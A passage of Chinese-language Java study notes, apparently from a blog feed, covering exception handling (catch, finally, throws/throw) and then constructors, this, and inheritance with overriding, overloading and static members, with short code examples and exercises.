<p>因为当发生异常时，程序控制由try块转到catch块，Java将跳过try中后面的语句，且永远不会从catch块返回到try块。因此若将整个程序代码都放在try中，若一开始发生异常，则后面的语句将永远不会被执行，从而影响了程序的实现。<br></font></p>
<p>&amp;emsp;</p>
<h4 id="3-3-catch语句"><a href="#3-3-catch语句" class="headerlink" title="3.3  catch语句"></a><font color="#20B2AA" face="Comic sans MS">3.3  catch语句</font></h4><table><tr><td bgcolor=#ADD8E6><font face="Comic sans MS">**📒(1)** <font color="red">**try语句后面必须跟有一个或多个catch语句来处理try中产生的异常事件**</font>。如果try语句中未产生异常，
  那么catch语句将不执行。 
**📒(2)catch语句需要一个参数：**<font color="red">**一个异常类名和该异常类的对象。注意该异常类必须是Throwable类的子类**</font>.
**📒(3)** try块中发生了一个异常，try-catch语句就会自动在try块后面的各个catch块中，找出与该异常类相
        匹配的参数。当参数符合以下3个条件之一时，就认为这个参数与产生的异常相匹配：
        （1）参数与产生的异常属于一个类；
        （2）参数是产生的异常的父类；
        （3）参数是一个接口时，产生的异常实现了这一接口。 
<font color="red">**📒(4) 注意：**</font>
(1) 当产生的异常找到了第一个与之相匹配的参数时，就执行包含这一参数的catch语句中的Java代码，执
行完catch语句后，程序恢复执行，但不会回到异常发生处继续执行，而是执行try-catch结构后面的代码。
(2) 可以用一个catch块来处理多个异常类型，此时catch的参数应该是这多个异常的父类。
(3) 有多个catch块时，要细心安排catch块的顺序。<font color="red">  **将子类的catch块放在前面，父类的catch块放在后面。**</font>
</font></td></tr></table>

<p>&amp;emsp;</p>
<h4 id="3-4-finally子句"><a href="#3-4-finally子句" class="headerlink" title="3.4  finally子句"></a><font color="#20B2AA" face="Comic sans MS">3.4  finally子句</font></h4><table><tr><td bgcolor=#ADD8E6><font face="Comic sans MS"><font color="red">**1.finally语句：**</font> 无论在try块中是否产生异常，也不管产生的异常是否会被捕获，finally中的语句最终都会
                           被执行。
<font color="red">**2.作用：**</font> 为异常处理事件提供一个清理机制,例如清理打开文件、Socket、JDBC连接之类的资源。

<p>  如果程序用到了文件、Socket、JDBC连接之类的资源，即使遇到了异常，也要正确释放占用的资源。<br>&amp;ensp;<strong>finally语句可以说是为异常处理事件提供的一个清理机制. 一般是用来关闭文件或释放其他的系统资源，作<br>  为try-catch-finally结构的一部分，可以没有finally语句，如果存在finally语句，不论try块中是否发生<br>  了异常，是否执行过catch语句，都要执行finally语句。</strong></p>
<p><font color="red"><strong>3. 带有finally子句的try-catch-finally语句的形式如下：</strong></font></font></td></tr></table>  </p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">try</span> &#123; … &#125;           <span class="comment">//…是正常执行的代码, 可能产生异常</span></span><br><span class="line">       <span class="keyword">catch</span> (异常类<span class="number">1</span> e) &#123; … &#125;    <span class="comment">//…是异常类1的处理代码</span></span><br><span class="line">       <span class="keyword">catch</span> (异常类<span class="number">2</span> e) &#123; … &#125;    <span class="comment">//…是异常类1的处理代码</span></span><br><span class="line">        ……</span><br><span class="line">      <span class="keyword">catch</span> (异常类n e) &#123; … &#125;   <span class="comment">//…是异常类2的处理代码</span></span><br><span class="line">      <span class="keyword">finally</span> &#123; … &#125;                   <span class="comment">//…是执行清除工作的语句</span></span><br></pre></td></tr></table></figure>

<table><tr><td bgcolor=#ADD8E6><font face="Comic sans MS"><font color="red">**4.执行过程：**</font> 
**(1) try块中的语句没有产生异常。**在这种情况下，Java首先执行try块中的所有的语句，然后执行finally子句
    中的代码，最后执行try…catch..finally块后面的语句；
**(2) try块中的语句产生了异常，而且此异常在方法内被捕获(有catch匹配)。** 在这种情况下，Java首先执行try
    块中的语句，直到产生异常处，然后跳过此try块中剩下的语句，执行捕获此异常的catch子句的处理代码；
    然后执行finally子句中的代码；
**(3) 如果在catch子句又重新抛出了异常。**也会执行finally，然后将这个异常抛出给方法的调用者；
**(4) try块中产生了异常，而此异常在方法内没有被捕获(没有catch匹配) 。**在这种情况下，Java将执行try块
    中的代码直到产生异常，然后跳过try块中的代码而转去执行finally子句中的代码，最后将异常抛出给方法
    的调用者。
</font></font></td></tr></table>  

<p>&amp;emsp;<br>&amp;emsp;</p>
<h3 id="四、-throws-throw抛出异常"><a href="#四、-throws-throw抛出异常" class="headerlink" title="四、 throws-throw抛出异常"></a><font color="#FF6347" face="Comic sans MS">四、 throws-throw抛出异常</font></h3><h4 id="4-1-throws抛出异常"><a href="#4-1-throws抛出异常" class="headerlink" title="4.1  throws抛出异常"></a><font color="#20B2AA" face="Comic sans MS">4.1  throws抛出异常</font></h4><p><font face="Comic sans MS"><font color="red"><strong>📒throws说明：</strong></font><br><strong>在设计可能会抛出异常的方法时，可以有两个选择：</strong><br><font color="#00B2EE"><strong>(1) 使用try-catch-finally处理方法中的异常</strong></font>；<br><font color="#00B2EE"><strong>(2) 声明抛出异常：</strong></font>不捕获异常(<font color="red">没有throws方法的创建异常类的实例和抛出异常。是个空语句。</font>)，而是将异常交由上一层处理，在其他地方捕获异常。如果使用后者，那么应该（在某些情况下）向编译器表明：此方法可能会抛出异常，但方法本身不会捕获它。可以在方法头中用throws子句来实现此功能。</p>
<p>(2.1)带throws异常说明的方法说明形式如下：<br>       <font color="#00B2EE"> …  方法名(…) [throws 异常类列表]<br>        { 方法体  }<br></font><br>&amp;emsp;<br><font color="red"><strong>📒注意：</strong></font><br> （１）方法抛出的异常类是throws子句中指定的异常类或其子类。<br> （２）并不是所有可能发生的异常都要在方法的说明中指定，从Error类中派生出的异常和从RuntimeException类中派生的异常就不用在方法声明中指定。</p>
<p><font color="red"><strong>📒在下列情况下Java方法可以声明抛出异常：</strong></font><br> （１）调用的方法抛出了异常；<br> （２）检测到了错误并使用throw语句抛出异常；<br></font> </p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">例<span class="number">1</span>：调用的方法抛出了异常 </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span> </span>&#123;……</span><br><span class="line"> <span class="function"><span class="keyword">public</span> String <span class="title">getInput</span><span class="params">()</span> <span class="keyword">throws</span> IOException</span></span><br><span class="line"><span class="function"> </span>&#123;……</span><br><span class="line">    System.in.read();</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">例<span class="number">2</span>：检测到了错误并使用<span class="keyword">throw</span>语句抛出异常</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"> <span class="class"><span class="keyword">class</span> <span class="title">Test</span> </span>&#123;……</span><br><span class="line"> <span class="function"><span class="keyword">public</span> String <span class="title">getInput</span><span class="params">()</span> <span class="keyword">throws</span> IOException</span></span><br><span class="line"><span class="function"> </span>&#123;……</span><br><span class="line">     IOException ae =<span class="keyword">new</span> IOException(<span class="string">&quot;buffer is full&quot;</span>);</span><br><span class="line">    <span class="keyword">throw</span> ae; </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">例<span class="number">3</span>： <span class="keyword">throws</span>多个异常</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Animation</span></span></span><br><span class="line"><span class="class"></span>&#123;                                                   </span><br><span class="line"> <span class="function"><span class="keyword">public</span> Image <span class="title">loadImage</span><span class="params">(String s)</span> <span class="keyword">throws</span>  </span></span><br><span class="line"><span class="function">                 EOFException, MalformURLException  </span></span><br><span class="line"><span class="function"> </span>&#123;</span><br><span class="line">  ……</span><br><span class="line"> &#125;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>

<p>&amp;emsp;<br>&amp;emsp;</p>
<h4 id="4-2-throw抛出异常"><a href="#4-2-throw抛出异常" class="headerlink" title="4.2  throw抛出异常"></a><font color="#20B2AA" face="Comic sans MS">4.2  throw抛出异常</font></h4><p><font face="Comic sans MS"><font color="red"><strong>📒throw说明：</strong></font><br><strong>要使用throw，则必须在方法名后面指出throws；但是使用throws，抛出可以是空语句不用写，交给上一层处理！！</strong><br>在捕获一个异常前，必须有一段Java代码来生成和抛出一个异常对象。Java用throw语句抛出异常。throw语句的格式如下：<br>                <font color="red">throw ThrowableObject；<br></font><br>&amp;emsp;<br><font color="#00B2EE"><strong>异常对象的生成和抛出可以有以下三种情况：</strong></font><br>　　　（１）Java运行时系统<br>　　　（２）JDK中某个类<br>　　　（３）在程序中创建异常对象抛出</p>
<p><font color="#00B2EE"><strong>使用throw语句应注意：</strong></font><br>（１）一般这种抛出异常的语句应该在满足一定条件执行，例如把throw语句if分支中<br>（２）含有throw语句的方法，应该在方法头定义中用throws语句声明所有可能抛出的异常</p>
<p><font color="#00B2EE"><strong>抛出异常有这样三步：</strong></font><br>    （1）确定异常类；<br>    （2）创建异常类的实例；<br>    （3）抛出异常。<br></font></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">举例</span><br><span class="line"><span class="function"><span class="keyword">static</span> String <span class="title">getInput</span><span class="params">()</span> <span class="keyword">throws</span> IOException</span>&#123;</span><br><span class="line">  <span class="keyword">char</span>[] buffer =<span class="keyword">new</span> <span class="keyword">char</span>[<span class="number">20</span>];</span><br><span class="line">   <span class="keyword">int</span> counter = <span class="number">0</span>;</span><br><span class="line">   <span class="keyword">boolean</span> flag =<span class="keyword">true</span>;</span><br><span class="line">   <span class="keyword">while</span>(flag) &#123;</span><br><span class="line">       buffer[counter] =(<span class="keyword">char</span>)System.in.read(); </span><br><span class="line">         </span><br><span class="line">      <span class="keyword">if</span>(buffer[counter]==<span class="string">&#x27;\n&#x27;</span>) flag = <span class="keyword">false</span>;</span><br><span class="line">      counter++;</span><br><span class="line">      <span class="keyword">if</span>(counter&gt;=<span class="number">20</span>)&#123;</span><br><span class="line">&#125; IOException ae =<span class="keyword">new</span> IOException(<span class="string">&quot;buffer is full&quot;</span>); </span><br><span class="line">      <span class="keyword">throw</span> ae; &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> String(buffer);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"> <span class="string">&quot;//IOException ae =new IOException(&quot;</span><span class="string">&quot;buffer is full&quot;</span><span class="string">&quot;);  throw ae;&quot;</span>使用<span class="keyword">throw</span></span><br></pre></td></tr></table></figure>


<p>&amp;emsp;<br>&amp;emsp;</p>
<h3 id="五、-正确地使用异常"><a href="#五、-正确地使用异常" class="headerlink" title="五、 正确地使用异常"></a><font color="#FF6347" face="Comic sans MS">五、 正确地使用异常</font></h3><table><tr><td bgcolor=#ADD8E6><font face="Comic sans MS">由于异常使用起来非常方便，以至于在很多情况下可能会滥用异常。但是，使用异常处理会降低程序运行的
速度，几点建议：

<p><font color="red"><strong>（1） 在可以使用简单的测试就能完成的检查中，不要使用异常来代替它。</strong></font>例如：<br>      if (ins!&#x3D;null)       &#x2F;&#x2F;使用ins引用对象<br>       {  …   }</p>
<p><font color="red"><strong>（2） 不要过细地使用异常。</strong></font>最好不要到处使用异常，更不要在循环体内使用异常处理, 可以将它包裹在循环<br>体外面。<br><font color="red"><strong>（3）不要捕获了一个异常而又不对它做任何的处理。</strong></font><br>   try<br>   {<br>     …… &#x2F;&#x2F;正常执行的代码<br>   }<br>   catch(Exception e) {  }</p>
<p><font color="red"><strong>(4) 将异常保留给方法的调用者并非不好的做法。</strong></font><br>     对于有些异常，将其交给方法的调用者去处理是一种更好的处理办法。没有类似这样if(counter&gt;&#x3D;20){<br>      IOException ae &#x3D;new IOException(“buffer is full”);<br>      throw ae; }的语句，是个空语句。<br></font></font></td></tr></table>  </p>
<hr>
<hr>
<p>&amp;emsp;<br>&amp;emsp;<br>&amp;emsp;<br>&amp;emsp;</p>
]]></content>
      <categories>
        <category>Java</category>
      </categories>
      <tags>
        <tag>Java学习</tag>
      </tags>
  </entry>
  <entry>
    <title>Java构造方法、对象创建、继承(4.5-4.6)</title>
    <url>/post/Java-Inherit-4/</url>
    <content><![CDATA[<p>&amp;ensp;<br>&amp;ensp;</p>
<center><font color="#3CB371" face="Comic sans MS" size=5>继承</font></center>

<p>&amp;ensp;<br>&amp;ensp;</p>
<h3 id="一、-构造方法"><a href="#一、-构造方法" class="headerlink" title="一、 构造方法"></a><font color="#FF6347" face="Comic sans MS">一、 构造方法</font></h3><p><font color="red"><strong>📒定义：</strong></font> 构造方法是一种特殊的、与类同名的方法，专门用于<font color="red">创建对象，完成初始化工作。</font> </p>
<p>&amp;emsp;</p>
<table><tr><td bgcolor=#ADD8E6><font face="Comic sans MS"><font color="red">**📒构造方法的特殊性：**</font> 
**(1)构造方法的方法名与类名相同。**
**(2)构造方法没有返回类型，也不能写void。**
**(3)构造方法的主要作用是完成对类对象的初始化工作。**
**(4)构造方法一般不能由编程人员显式地直接调用，而是用new来调用。**
**(5)在创建一个类的新对象的同时，系统会自动调用该类的构造方法为新对象初始化。**
**(6)在Java中，每个类都至少有一个构造方法，如果没有显示地定义构造方法，Java
   会自动提供一个缺省的构造方法。**
</font></td></tr></table>

<p>&amp;emsp;<br>&amp;emsp;</p>
<h4 id="1-1-构造方法说明"><a href="#1-1-构造方法说明" class="headerlink" title="1.1  构造方法说明"></a><font color="#3CB371" face="Comic sans MS">1.1  构造方法说明</font></h4><p><font color="red"><strong>📒构造方法说明形式如下：</strong></font><br><font color="red">[构造方法修饰符] 方法名（[形式参数列表]）[throws异常列表] {方法体}</font> </p>
<table><tr><td bgcolor=#ADD8E6><font face="Comic sans MS">**📒当构造一个类的实例时，编译器主要完成以下3件事情：**
(1) 为对象分配内存空间(堆)；
(2) 按缺省值初始化对象中的实例变量的值；
(3) 调用对象的构造方法(可以在构造方法中初始化其他的值)；
(4) 对象变量都是引用型变量。
</font></td></tr></table>

<p>&amp;emsp;<br>&amp;emsp;</p>
<h4 id="1-2-构造方法的重载"><a href="#1-2-构造方法的重载" class="headerlink" title="1.2  构造方法的重载"></a><font color="#3CB371" face="Comic sans MS">1.2  构造方法的重载</font></h4><table><tr><td bgcolor=#ADD8E6><font face="Comic sans MS">(1)  缺省的构造方法：如果没有定义构造方法，则Java自动提供了一个缺省的构造方法，如下：
public Person(){}；//对象成员变量的初值按Java规定
(2)  带参数的构造方法：按需要将一些指定的参数传递给构造方法 
 例如：public Person(String n){Name=n;}
**📒定义构造方法注意：**
&emsp;只要类中显式定义了一个或多个构造方法，而且所有显式定义的构造方法都带参数，那么将失去缺省
   构造方法。
</font></td></tr></table>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">PersonC(String n ,<span class="keyword">int</span> a)&#123;</span><br><span class="line">   name=n;</span><br><span class="line">   age=a;</span><br><span class="line">   System.out.println(<span class="string">&quot;The Person&#x27;s name is &quot;</span>+name+<span class="string">&quot;,age is &quot;</span>+age);&#125; </span><br><span class="line"> <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String args[])</span></span>&#123;</span><br><span class="line">      PersonC per1=<span class="keyword">new</span> PersonC();</span><br><span class="line">      PersonC per2=<span class="keyword">new</span> PersonC(<span class="string">&quot;wang li&quot;</span>);</span><br><span class="line">      PersonC per3=<span class="keyword">new</span> PersonC(<span class="string">&quot;li ming&quot;</span>,<span class="number">24</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>&amp;emsp;<br>&amp;emsp;</p>
<h4 id="1-3-对象的创建"><a href="#1-3-对象的创建" class="headerlink" title="1.3  对象的创建"></a><font color="#3CB371" face="Comic sans MS">1.3  对象的创建</font></h4><table><tr><td bgcolor=#ADD8E6><font face="Comic sans MS">**1.3.1 📒对象说明：**
对象说明的语法形式为：
&emsp;&emsp;&emsp;<font color="red">类名&emsp;对象名；</font>
**1.3.2. 📒对象的实例化和初始化:**
**对象构造的语法形式为：**
&emsp;&emsp;&emsp;<font color="red">对象名=new 类构造方法名([实参表]);</font> 
**由new操作符和相应的构造方法完成：**
new以类为模板，开辟空间并执行相应的构造方法，完成对象的实例化和初始化，并返回该对象的一个引
用（即该对象所在的内存首地址)
</font></td></tr></table>

<p>&amp;emsp;<br>&amp;emsp;</p>
<h4 id="1-4-this的使用"><a href="#1-4-this的使用" class="headerlink" title="1.4  this的使用"></a><font color="#3CB371" face="Comic sans MS">1.4  this的使用</font></h4><table><tr><td bgcolor=#ADD8E6><font face="Comic sans MS">**1.4.1 📒使用this来访问成员变量及方法**
在方法及构造方法中，可以使用this来访问对象的属性和方法 .
**1.4.2. 📒构造方法中，用this调用另一构造方法：**
**1.4.3. 📒使用this的注意事项：**
(1)通过this不仅可以引用该类中定义的变量和方法，还可以引用该类的父类中定义的成员变量和方法。
(2)在所有的非static方法中，都隐含了一个参数this。而static方法中，不能使用this。
</font></td></tr></table>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="number">1.4</span><span class="number">.1</span></span><br><span class="line"> Person(String n,<span class="keyword">int</span> a)&#123;</span><br><span class="line">        name=n;</span><br><span class="line">        age=a;</span><br><span class="line">    &#125; </span><br><span class="line">等价于如下：</span><br><span class="line"> Person(String name,<span class="keyword">int</span> age)</span><br><span class="line">           &#123;<span class="keyword">this</span>.name=name;</span><br><span class="line">             <span class="keyword">this</span>.age=age;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="number">1.4</span><span class="number">.2</span> </span><br><span class="line"> Desk()&#123;   Color=<span class="string">&quot;&quot;</span>;</span><br><span class="line">           Length=<span class="number">0</span>;</span><br><span class="line">         Width=<span class="number">0</span>;</span><br><span class="line">         Height=<span class="number">0</span>;&#125; </span><br><span class="line"> Desk(String C,<span class="keyword">int</span> L,<span class="keyword">int</span> W,<span class="keyword">int</span> H)</span><br><span class="line">  &#123;Color=C;</span><br><span class="line">     Length=L;</span><br><span class="line">   Width=W;</span><br><span class="line">   Height=H;&#125; </span><br><span class="line"> Desk()&#123;</span><br><span class="line">    <span class="keyword">this</span>(<span class="string">&quot;&quot;</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>);&#125;</span><br></pre></td></tr></table></figure>

<p>&amp;emsp;<br>&amp;emsp;</p>
<h3 id="二、-继承"><a href="#二、-继承" class="headerlink" title="二、 继承"></a><font color="#FF6347" face="Comic sans MS">二、 继承</font></h3><h4 id="2-1-类继承语法形式"><a href="#2-1-类继承语法形式" class="headerlink" title="2.1  类继承语法形式"></a><font color="#3CB371" face="Comic sans MS">2.1  类继承语法形式</font></h4><table><tr><td bgcolor=#ADD8E6><font face="Comic sans MS">**2.1.1 📒类继承语法形式如下：**
&emsp;&emsp;<font color="red">class&emsp;SubClassName&emsp;extends&emsp;SupperClassName</font>
extends：继承关键词
SubClassName：新的子类名
SupperClassName：继承的父类名，必须有且只能一个（即每个子类有且只能有一个父类）
**2.1.2 📒子类的特性:**
(1) 子类拥有其父类的所有属性和方法。但父类中说明为private的属性和方法，子类不可直接访问。
(2) 子类可以对父类的方法覆盖或重载。
</font></td></tr></table>

<p>&amp;emsp;<br>&amp;emsp;</p>
<h4 id="2-2-属性的继承、隐藏和添加"><a href="#2-2-属性的继承、隐藏和添加" class="headerlink" title="2.2  属性的继承、隐藏和添加"></a><font color="#3CB371" face="Comic sans MS">2.2  属性的继承、隐藏和添加</font></h4><p><strong>注意：属性叫隐藏，方法叫覆盖</strong><br><font face="Comic sans MS"><strong>2.2.1 📒属性的继承：</strong><br>• 子类可以继承父类的所有属性（只要该属性没有private修饰）<br>• 通过属性的继承，子类不需要把父类属性的定义部分重复定义一遍，这样做的好处是减少程序维护的工作量。<br><font color="red">例如：ColorPoint类自动具有Point类的坐标a,b属性</font></font><br>&amp;emsp;<br><font face="Comic sans MS"><strong>2.2.2 📒属性的隐藏：</strong><br>子类重新定义一个与父类那里继承来的成员变量完全相同的变量，就称作属性的隐藏。</font></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"> <span class="class"><span class="keyword">class</span> <span class="title">living</span></span></span><br><span class="line"><span class="class"></span>&#123;   <span class="keyword">public</span> <span class="keyword">int</span> age; &#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">human</span> <span class="keyword">extends</span> <span class="title">living</span></span></span><br><span class="line"><span class="class"></span>&#123;   <span class="keyword">public</span> <span class="keyword">int</span> age; <span class="comment">//将父类的age隐藏</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String args[])</span></span></span><br><span class="line"><span class="function">   </span>&#123; human h1=<span class="keyword">new</span> human(); h1.age=<span class="number">20</span>;&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>&amp;emsp;<br><font face="Comic sans MS"><strong>2.2.3 📒属性的添加：</strong></font><br>在定义子类时，加上的新的属性变量，就可以使子类比父类多一些属性</p>
<p><font color="red">例如：ColorPoint类比父类Point多了一个属性，颜色（color）</font></p>
<p>&amp;emsp;<br>&amp;emsp;</p>
<h4 id="2-3-方法的继承、覆盖、重载和添加"><a href="#2-3-方法的继承、覆盖、重载和添加" class="headerlink" title="2.3  方法的继承、覆盖、重载和添加"></a><font color="#3CB371" face="Comic sans MS">2.3  方法的继承、覆盖、重载和添加</font></h4><p><font face="Comic sans MS"><strong>2.3.1 📒方法的继承：</strong><br>父类的非私有方法也可以被子类自动继承。例如类A具有method()方法，那它的子类B不定义该方法也同样拥有method()。</font></p>
<p>&amp;emsp;<br><font face="Comic sans MS"><strong>2.3.2 📒方法的覆盖：</strong></font></p>
<p><font color="red"><strong>方法的覆盖</strong></font>(方法用覆盖这个词修饰，属性用隐藏这个词来修饰)<br>覆盖：在子类中定义的方法和父类中的方法的首部是一样的，包括方法名、参数列表、返回类型和异常抛出。但方法体的实现改变了。<br><img data-src="https://i.loli.net/2018/12/26/5c23095dc4ba6.png" alt="1.png"></p>
<p><font face="Comic sans MS" color="red"><strong>例如:</strong></font></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span></span>&#123;</span><br><span class="line">……</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">method</span><span class="params">(<span class="keyword">int</span> x, <span class="keyword">int</span> y)</span></span></span><br><span class="line"><span class="function"><span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">……</span><br><span class="line">&#125;</span><br><span class="line">……</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span> <span class="keyword">extends</span> <span class="title">A</span></span>&#123;</span><br><span class="line">……</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">method</span><span class="params">(<span class="keyword">int</span> x, <span class="keyword">int</span> y)</span> <span class="keyword">throws</span>  <span class="comment">//覆盖父类的方法method(int x, int y)</span></span></span><br><span class="line"><span class="function">IOException</span>&#123;</span><br><span class="line">……</span><br><span class="line">&#125;</span><br><span class="line">……</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>&amp;emsp;<br><font face="Comic sans MS" color="red">覆盖的效果：当一个B类对象调用method方法时它只会使用B类的method版本，而父类A的method版本被覆盖掉了</font><br><font face="Comic sans MS"><strong>在覆盖时要注意以下几点：</strong><br>（1）覆盖的方法的<font color="#00B2EE"><strong>首部</strong></font>必须要和被覆盖的方法的首部完全匹配，才能达到覆盖的效果；<br>（2）覆盖的方法的<font color="#00B2EE"><strong>返回值类型</strong></font>必须和被覆盖的方法的返回值类型一致；<br>（3）覆盖的方法所<font color="#00B2EE"><strong>抛出的异常</strong></font>必须和被覆盖方法的所抛出的异常一致，或者是其子类；<br>（4）被覆盖的方法<font color="#00B2EE"><strong>不能为private</strong></font>，否则在其子类中只是新定义了一个方法，并没有对其进行覆盖</font><br>&amp;emsp;<br><font face="Comic sans MS"><strong>2.3.3 📒方法的重载：</strong><br><font color="red"><strong>含义：方法名相同，但参数列表不同</strong></font><br>通过方法的覆盖，能够修改对象的同名方法的具体实现体，相同的方法在各个子类中实现的版本可以不一样.<br>&amp;emsp;&amp;emsp;&amp;emsp;&amp;emsp;&amp;emsp;&amp;emsp; —&amp;ensp;—实现多个类中多态性的基础之一<br><font color="red"><strong>重载的效果：</strong></font>父类A的method版本不会被覆盖掉，相当于在子类B中有两个method方法，一个来自父类，一个自己加的，它们之间的参数列表不一样.<br><font color="red"><strong>注意：</strong></font><br>（1）在使用重载时只能通过不同的参数表样式。<br>（2）不能通过访问权限、返回类型、抛出的异常进行重载；(但是同一类里面的成员方法可以这样重载)<br>（3）被重载的方法不能为private，否则在其子类中只是新定义了一个方法，并没有对其进行重载。</p>
<p><font color="red"><strong>特别注意：</strong></font>在继承机制中，不允许在子类中降低成员(包括变量和方法)的访问权限（访问权限大小关系是private &lt; 缺省 &lt; protected &lt; public）。即如果一个方法在父类中是protected的，那么在子类中要重载或覆盖该方法时，就不能把该方法改成是缺省或private，否则会出现编译错误。</font><br>&amp;emsp;<br><font color="green"><em>习题1：分析下列程序输出结果</em> </font></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span></span></span><br><span class="line"><span class="class"></span>&#123;          <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">PrintNumber</span><span class="params">(<span class="keyword">int</span> a)</span></span></span><br><span class="line"><span class="function">           </span>&#123;          System.out.println(++a);</span><br><span class="line">           &#125;            </span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span> <span class="keyword">extends</span> <span class="title">A</span></span></span><br><span class="line"><span class="class"></span>&#123;          <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">PrintNumber</span><span class="params">(<span class="keyword">int</span> a,<span class="keyword">int</span> b)</span></span></span><br><span class="line"><span class="function">           </span>&#123;          System.out.println(a);</span><br><span class="line">           &#125;  </span><br><span class="line">           <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String args[])</span></span></span><br><span class="line"><span class="function">         </span>&#123;  </span><br><span class="line">                   B b=<span class="keyword">new</span> B();</span><br><span class="line">                   b.PrintNumber(<span class="number">100</span>);         </span><br><span class="line">          &#125;   </span><br><span class="line">&#125;</span><br><span class="line">输出结果：<span class="number">101</span></span><br></pre></td></tr></table></figure>

<p>&amp;emsp;<br><font color="green"><em>习题2：分析下列程序输出结果</em> </font></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span></span></span><br><span class="line"><span class="class"></span>&#123;          <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">PrintNumber</span><span class="params">(<span class="keyword">int</span> a)</span></span></span><br><span class="line"><span class="function">           </span>&#123;          System.out.println(++a);</span><br><span class="line">           &#125;            </span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span> <span class="keyword">extends</span> <span class="title">A</span></span></span><br><span class="line"><span class="class"></span>&#123;          <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">PrintNumber</span><span class="params">(<span class="keyword">int</span> a)</span></span></span><br><span class="line"><span class="function">           </span>&#123;          System.out.println(--a);</span><br><span class="line">           &#125;  </span><br><span class="line">           <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String args[])</span></span></span><br><span class="line"><span class="function">         </span>&#123;  </span><br><span class="line">                   B b=<span class="keyword">new</span> B();</span><br><span class="line">                   b.PrintNumber(<span class="number">100</span>);         </span><br><span class="line">          &#125;   </span><br><span class="line">&#125;</span><br><span class="line">输出结果：<span class="number">99</span></span><br></pre></td></tr></table></figure>

<p>&amp;emsp;<br>&amp;emsp;<br><font face="Comic sans MS"><strong>2.3.4 📒方法的添加：</strong><br><font color="red"><strong>子类可以新加一些方法，以针对子类实现相应的功能.</strong></font><br></font></p>
<p>&amp;emsp;<br>&amp;emsp;</p>
<h5 id="2-4-静态成员变量的继承"><a href="#2-4-静态成员变量的继承" class="headerlink" title="2.4  静态成员变量的继承"></a><font color="#3CB371" face="Comic sans MS">2.4  静态成员变量的继承</font></h5><p><font face="Comic sans MS">(1)某类的静态成员为该类及该类的所有子类所共有；<br>(2)如果子类中新定义的静态成员变量与父类中的某个静态成员变量同名，则这两个静态成员变量相互独立。</font></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">(<span class="number">1</span>)</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">a</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">  <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">int</span> b=<span class="number">10</span>; <span class="comment">//静态属性</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test</span> <span class="keyword">extends</span> <span class="title">a</span></span></span><br><span class="line"><span class="class"></span>&#123; </span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String args[])</span></span></span><br><span class="line"><span class="function">  </span>&#123;</span><br><span class="line">    test.b=<span class="number">20</span>;</span><br><span class="line">    System.out.println(a.b);        </span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">输出结果：<span class="number">20</span></span><br></pre></td></tr></table></figure>

